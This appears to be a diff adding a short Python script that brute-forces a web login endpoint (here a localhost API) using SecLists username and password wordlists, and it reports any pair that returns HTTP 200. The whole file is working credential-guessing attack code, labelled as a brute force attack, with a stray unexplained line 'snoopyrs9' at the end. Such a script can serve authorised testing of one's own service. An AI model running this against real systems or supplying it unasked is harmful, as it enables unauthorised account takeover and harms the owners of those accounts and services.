@@ -1,0 +1,72 @@
+import requests
+import sys
+
+# Configuration
+URL = "http://localhost:5000/api/auth/login"
+USERNAME_FILE = "SecLists/Usernames/top-usernames-shortlist.txt"
+PASSWORD_FILE = "SecLists/Passwords/Common-Credentials/10k-most-common.txt"
+
+def brute_force_single_user(username):
+    """Brute force a single username with password list"""
+    print(f"\n[*] Testing username: {username}")
+    
+    try:
+        with open(PASSWORD_FILE, 'r', encoding='latin-1') as f:
+            passwords = f.readlines()
+    except FileNotFoundError:
+        print(f"[!] Password file not found: {PASSWORD_FILE}")
+        return
+    
+    for password in passwords:
+        password = password.strip()
+        
+        data = {
+            "username": username,
+            "password": password
+        }
+        
+        try:
+            response = requests.post(URL, json=data)
+            
+            if response.status_code == 200:
+                print(f"\n[+] SUCCESS! Username: {username} | Password: {password}")
+                return True
+            elif response.status_code == 400:
+                # Invalid credentials, continue
+                print(f"[-] Failed: {password}", end='\r')
+            else:
+                print(f"[!] Unexpected status: {response.status_code}")
+                
+        except requests.exceptions.RequestException as e:
+            print(f"[!] Request error: {e}")
+            continue
+    
+    print(f"\n[-] No password found for {username}")
+    return False
+
+def brute_force_usernames():
+    """Brute force both usernames and passwords"""
+    try:
+        with open(USERNAME_FILE, 'r', encoding='latin-1') as f:
+            usernames = f.readlines()
+    except FileNotFoundError:
+        print(f"[!] Username file not found: {USERNAME_FILE}")
+        return
+    
+    for username in usernames:
+        username = username.strip()
+        if brute_force_single_user(username):
+            break
+
+if __name__ == "__main__":
+    print("[*] Starting brute force attack...")
+    print(f"[*] Target: {URL}")
+    
+    # If you know a specific username, use this:
+    # brute_force_single_user("admin")
+    
+    # Or brute force both usernames and passwords:
+    brute_force_usernames()
+
+
+ snoopyrs9
